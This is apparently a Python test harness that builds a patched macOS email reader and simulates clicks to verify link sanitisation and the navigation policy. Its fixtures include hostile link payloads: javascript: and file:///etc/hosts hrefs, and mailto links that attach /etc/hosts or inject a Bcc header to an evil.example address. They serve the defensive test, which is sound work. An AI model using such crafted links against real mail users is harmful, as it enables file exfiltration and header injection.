#!/usr/bin/env python3
"""Click links in the real AppKit reader (MailWindow + WKWebView) on a disposable demo store.

Clicks are hit-tested by AppKit and delivered as mouse events to the reader's
WKWebView, so WebKit's own user-gesture handling decides the navigation type.
The system opener is replaced by a recorder, so no browser or mail app opens
unless --open-in-browser is given; that flag opens one http://127.0.0.1 link
for real and checks that the default browser requested it.
"""
from pathlib import Path
import argparse, http.server, os, subprocess, tempfile, threading, time

parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
parser.add_argument('--library', type=Path, required=True, help='Built macOS libmail_service.dylib')
parser.add_argument('--snapshots', type=Path, help='Directory for reader snapshots (PNG)')
parser.add_argument('--open-in-browser', action='store_true', help='Also open one localhost link in the default browser')
args = parser.parse_args()
library = args.library.resolve(strict=True)
root = Path(__file__).resolve().parents[3]
source = root / 'apps/macos/Sources/EmailUI'

POLICY = 'func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction) async -> WKNavigationActionPolicy {'
OPENER = 'NSWorkspace.shared.open(url)\n            return .cancel'
ANCHOR = '    @objc private func editSelectedDraft() {'

check = r'''
    func checkReaderLinks() {
        func expect(_ ok: Bool, _ name: String) { precondition(ok, name); print("PASS \(name)") }
        let environment = ProcessInfo.processInfo.environment
        makeKeyAndOrderFront(nil)
        setContentSize(NSSize(width: 1280, height: 820))
        expect(readerSpin(15) { self.threads.contains { $0.id == "demo:3" } }, "demo inbox loaded")
        readerSetDemoHTML(environment["EMAIL_STORE_PATH"]!, """
        <p>Reader link check.</p>
        <p><a href="https://example.com/reader-link-check/plain">Plain link</a></p>
        <p><a href="https://example.com/reader-link-check/blank" target="_blank">Blank target link</a></p>
        <p><a href="mailto:hello@studio.example?subject=Reader%20link%20check">Mail link</a></p>
        <p><a href="mailto:hello@studio.example?subject=Hi&attach=/etc/hosts&X-Extra=1&body=Two%20lines">Attach mail link</a></p>
        <p><a href="mailto:?subject=No%20recipient">Empty mail link</a></p>
        <p><a href="javascript:alert(1)">Script link</a></p>
        <p><a href="file:///etc/hosts">File link</a></p>
        <p><a href="#reader-link-check-anchor">Anchor link</a></p>
        <p id="reader-link-check-anchor">Anchor target</p>
        """)
        let row = threads.firstIndex { $0.id == "demo:3" }!
        table.selectRowIndexes(IndexSet(integer: row), byExtendingSelection: false)
        func loaded(_ marker: String) -> Bool {
            currentWebDidCommit && webView?.isLoading == false && (currentHTML ?? "").contains(marker)
        }
        expect(readerSpin(15) { loaded("reader-link-check/plain") }, "service-sanitized message loads in reader")

        func links() -> [String: (href: String, target: String, point: CGPoint)] {
            let box = ReaderLinkBox()
            let script = "Array.from(document.querySelectorAll('a')).map(a => { const r = a.getBoundingClientRect(); return [a.textContent.trim(), a.getAttribute('href') || '', a.getAttribute('target') || '', r.left + r.width / 2, r.top + r.height / 2] })"
            webView!.evaluateJavaScript(script) { value, _ in box.value = value as? [[Any]] ?? [] }
            _ = readerSpin(5) { box.value != nil }
            var result: [String: (href: String, target: String, point: CGPoint)] = [:]
            for item in box.value ?? [] {
                result[item[0] as! String] = (item[1] as! String, item[2] as! String,
                                              CGPoint(x: (item[3] as! NSNumber).doubleValue, y: (item[4] as! NSNumber).doubleValue))
            }
            return result
        }
        func click(_ css: CGPoint, _ modifiers: NSEvent.ModifierFlags = []) {
            let view = webView!
            var point = CGPoint(x: css.x * view.pageZoom, y: css.y * view.pageZoom)
            if !view.isFlipped { point.y = view.bounds.height - point.y }
            let location = view.convert(point, to: nil)
            let target = contentView!.hitTest(contentView!.convert(location, from: nil))!
            precondition(target === view || target.isDescendant(of: view), "click lands on the reader web view")
            let sequence: [(NSEvent.EventType, Float)] = [(.mouseMoved, 0), (.leftMouseDown, 1), (.leftMouseUp, 0)]
            for (type, pressure) in sequence {
                let event = NSEvent.mouseEvent(with: type, location: location, modifierFlags: modifiers,
                                               timestamp: ProcessInfo.processInfo.systemUptime, windowNumber: windowNumber,
                                               context: nil, eventNumber: 0, clickCount: type == .mouseMoved ? 0 : 1, pressure: pressure)!
                // The harness runs as an accessory app and does not take focus from the
                // user's foreground app, so the window is not key and NSWindow.sendEvent
                // would treat the click as window activation. Deliver it to the view
                // AppKit hit-tests at that point instead.
                if isKeyWindow { sendEvent(event) }
                else if type == .leftMouseDown { target.mouseDown(with: event) }
                else if type == .leftMouseUp { target.mouseUp(with: event) }
                else { target.mouseMoved(with: event) }
                _ = readerSpin(0.05) { false }
            }
        }
        func opens(_ name: String, _ expected: String, _ modifiers: NSEvent.ModifierFlags = []) {
            let before = ReaderLinkCheck.opened.count
            click(links()[name]!.point, modifiers)
            expect(readerSpin(5) { ReaderLinkCheck.opened.count > before }, "\(name) click calls the system opener")
            _ = readerSpin(0.75) { ReaderLinkCheck.opened.count > before + 1 } // let a duplicate open show up
            expect(ReaderLinkCheck.opened.count == before + 1 && ReaderLinkCheck.opened.last?.absoluteString == expected,
                   "\(name) opens exactly \(expected)")
        }
        func staysInert(_ name: String, reaching url: String? = nil) {
            let opened = ReaderLinkCheck.opened.count
            let actions = ReaderLinkCheck.actions.count
            click(links()[name]!.point)
            _ = readerSpin(1.5) { false }
            expect(ReaderLinkCheck.opened.count == opened, "\(name) click opens nothing")
            if let url {
                expect(ReaderLinkCheck.actions[actions...].contains { $0 == "linkActivated same-frame " + url },
                       "\(name) click reaches the policy as \(url)")
            }
        }
        func readerUnchanged(_ marker: String, _ name: String) {
            // An in-page #anchor only changes the fragment of the same about:blank document.
            expect(webView?.url?.absoluteString.hasPrefix("about:blank") == true && links().keys.contains(marker), name)
        }
        func snapshot(_ name: String) {
            guard let directory = environment["READER_LINK_SNAPSHOTS"], let view = webView else { return }
            let box = ReaderLinkBox()
            view.takeSnapshot(with: nil) { image, _ in
                if let tiff = image?.tiffRepresentation, let rep = NSBitmapImageRep(data: tiff) {
                    try? rep.representation(using: .png, properties: [:])?.write(to: URL(fileURLWithPath: directory).appendingPathComponent(name))
                }
                box.value = []
            }
            _ = readerSpin(5) { box.value != nil }
        }

        var found = links()
        expect(found["Plain link"]?.href == "https://example.com/reader-link-check/plain", "sanitizer keeps https link")
        expect(found["Blank target link"]?.target == "", "sanitizer strips target attribute")
        expect(found["Script link"]?.href == "" && found["File link"]?.href == "", "sanitizer strips javascript: and file: hrefs")
        snapshot("reader-links-before.png")
        opens("Plain link", "https://example.com/reader-link-check/plain")
        expect(ReaderLinkCheck.actions.last?.hasPrefix("linkActivated same-frame") == true, "plain click is a user-activated same-frame navigation")
        opens("Blank target link", "https://example.com/reader-link-check/blank")
        opens("Mail link", "mailto:hello@studio.example?subject=Reader%20link%20check")
        opens("Attach mail link", "mailto:hello@studio.example?subject=Hi&body=Two%20lines")
        staysInert("Empty mail link", reaching: "mailto:?subject=No%20recipient")
        opens("Plain link", "https://example.com/reader-link-check/plain", .command)
        expect(ReaderLinkCheck.actions.last?.hasPrefix("linkActivated") == true, "command-click is user-activated and opens")
        staysInert("Script link")
        staysInert("File link")
        staysInert("Anchor link")
        print("INFO after anchor click: url=\(webView?.url?.absoluteString ?? "nil"), policy consulted=\(ReaderLinkCheck.actions.contains { $0.contains("#reader-link-check-anchor") })")
        readerUnchanged("Plain link", "reader still shows the message after clicks")
        snapshot("reader-links-after.png")

        // Unsanitized fixture: the policy alone must hold if a link ever reaches
        // the reader with target=_blank or a non-web scheme.
        showHTML("""
        <p><a href="https://example.com/reader-link-check/raw-blank" target="_blank">Raw blank</a></p>
        <p><a href="javascript:location='https://example.com/reader-link-check/js'">Raw script</a></p>
        <p><a href="file:///etc/hosts">Raw file</a></p>
        <p><a href="ftp://example.com/reader-link-check">Raw ftp</a></p>
        <p><a href="mailto:">Raw empty mail</a></p>
        <p><a href="mailto:a@example.com%0D%0ABcc:x@evil.example?attach=/etc/hosts">Raw injected mail</a></p>
        <meta http-equiv="refresh" content="1;url=https://example.com/reader-link-check/refresh">
        """)
        expect(readerSpin(10) { loaded("raw-blank") }, "unsanitized fixture loads")
        found = links()
        expect(found["Raw blank"]?.target == "_blank", "fixture keeps target=_blank")
        opens("Raw blank", "https://example.com/reader-link-check/raw-blank")
        expect(ReaderLinkCheck.actions.last?.hasPrefix("linkActivated new-window") == true, "target=_blank arrives with no target frame and opens")
        staysInert("Raw script")
        staysInert("Raw file")
        staysInert("Raw ftp", reaching: "ftp://example.com/reader-link-check")
        staysInert("Raw empty mail", reaching: "mailto:")
        staysInert("Raw injected mail", reaching: "mailto:a@example.com%0D%0ABcc:x@evil.example?attach=/etc/hosts")
        _ = readerSpin(2.5) { ReaderLinkCheck.actions.contains { $0.hasSuffix("/refresh") } }
        let refresh = ReaderLinkCheck.actions.first { $0.hasSuffix("/refresh") }
        print("INFO meta refresh navigation: \(refresh ?? "not attempted by WebKit")")
        expect(!ReaderLinkCheck.opened.contains { $0.absoluteString.hasSuffix("/refresh") }, "meta refresh opens nothing")
        readerUnchanged("Raw blank", "reader still shows the fixture after clicks and refresh")

        if let real = environment["READER_LINK_REAL_URL"] {
            showHTML("<p><a href=\"\(real)\">Real link</a></p>")
            expect(readerSpin(10) { loaded(real) }, "localhost fixture loads")
            ReaderLinkCheck.realOpen = true
            opens("Real link", real)
        }
        print("INFO navigation actions:\n  " + ReaderLinkCheck.actions.joined(separator: "\n  "))
        close()
    }
'''

main = r'''
import AppKit
import SQLite3
import WebKit

@MainActor enum ReaderLinkCheck {
    static var opened: [URL] = []
    static var actions: [String] = []
    static var realOpen = false
    static func record(_ action: WKNavigationAction) {
        let type = switch action.navigationType {
        case .linkActivated: "linkActivated"
        case .other: "other"
        case .reload: "reload"
        case .formSubmitted: "formSubmitted"
        case .formResubmitted: "formResubmitted"
        case .backForward: "backForward"
        @unknown default: "unknown"
        }
        actions.append("\(type) \(action.targetFrame == nil ? "new-window" : "same-frame") \(action.request.url?.absoluteString ?? "nil")")
    }
    static func open(_ url: URL) {
        opened.append(url)
        if realOpen { NSWorkspace.shared.open(url) }
    }
}

final class ReaderLinkBox: @unchecked Sendable { var value: [[Any]]? }

@MainActor func readerSpin(_ timeout: TimeInterval, _ condition: () -> Bool) -> Bool {
    let deadline = Date().addingTimeInterval(timeout)
    while !condition() && Date() < deadline { RunLoop.main.run(mode: .default, before: Date().addingTimeInterval(0.02)) }
    return condition()
}

func readerSetDemoHTML(_ path: String, _ html: String) {
    var db: OpaquePointer?
    precondition(sqlite3_open(path, &db) == SQLITE_OK)
    sqlite3_busy_timeout(db, 5000)
    var statement: OpaquePointer?
    precondition(sqlite3_prepare_v2(db, "UPDATE messages SET body_html=?1 WHERE id='demo:3'", -1, &statement, nil) == SQLITE_OK)
    let transient = unsafeBitCast(-1, to: sqlite3_destructor_type.self)
    sqlite3_bind_text(statement, 1, html, -1, transient)
    precondition(sqlite3_step(statement) == SQLITE_DONE && sqlite3_changes(db) == 1)
    sqlite3_finalize(statement)
    sqlite3_close(db)
}

@main struct Check {
    @MainActor static func main() {
        setvbuf(stdout, nil, _IOLBF, 0)
        let app = NSApplication.shared
        app.setActivationPolicy(.accessory)
        app.finishLaunching()
        let window = MailWindow()
        window.checkReaderLinks()
    }
}
'''


class Hits(http.server.BaseHTTPRequestHandler):
    seen = []

    def do_GET(self):
        Hits.seen.append(self.path)
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain; charset=utf-8')
        self.end_headers()
        self.wfile.write(b'Email reader link check: opened by the default browser. You can close this tab.\n')

    def log_message(self, *_):
        pass


with tempfile.TemporaryDirectory(prefix='email-reader-link-check-') as temp:
    p = Path(temp)
    text = source.joinpath('EmailUI.swift').read_text()
    for needle in (POLICY, OPENER, ANCHOR):
        if text.count(needle) != 1:
            raise SystemExit(f'expected exactly one match for {needle!r} in EmailUI.swift')
    text = text.replace(POLICY, POLICY + '\n        ReaderLinkCheck.record(navigationAction)')
    text = text.replace(OPENER, 'ReaderLinkCheck.open(url)\n            return .cancel')
    text = text.replace(ANCHOR, check + '\n' + ANCHOR)
    (p / 'EmailUI.swift').write_text(text)
    (p / 'Check.swift').write_text(main)
    sources = [str(f) for f in source.glob('*.swift') if f.name != 'EmailUI.swift']
    subprocess.run(['swiftc', '-parse-as-library', '-swift-version', '6', '-o', str(p / 'check'),
                    str(p / 'EmailUI.swift'), str(p / 'Check.swift'), *sources], check=True)
    env = dict(os.environ, EMAIL_STORE_PATH=str(p / 'mail.sqlite'), EMAIL_DEMO='1', MAIL_SERVICE_LIBRARY=str(library))
    if args.snapshots:
        args.snapshots.mkdir(parents=True, exist_ok=True)
        env['READER_LINK_SNAPSHOTS'] = str(args.snapshots.resolve())
    server = None
    if args.open_in_browser:
        server = http.server.HTTPServer(('127.0.0.1', 0), Hits)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        env['READER_LINK_REAL_URL'] = f'http://127.0.0.1:{server.server_port}/reader-link-check'
    subprocess.run([str(p / 'check')], env=env, check=True)
    if server:
        deadline = time.time() + 15
        while '/reader-link-check' not in Hits.seen and time.time() < deadline:
            time.sleep(0.2)
        server.shutdown()
        if '/reader-link-check' not in Hits.seen:
            raise SystemExit('FAIL default browser did not request the opened localhost link')
        print('PASS default browser requested the opened localhost link')
    print('Reader link checks passed')
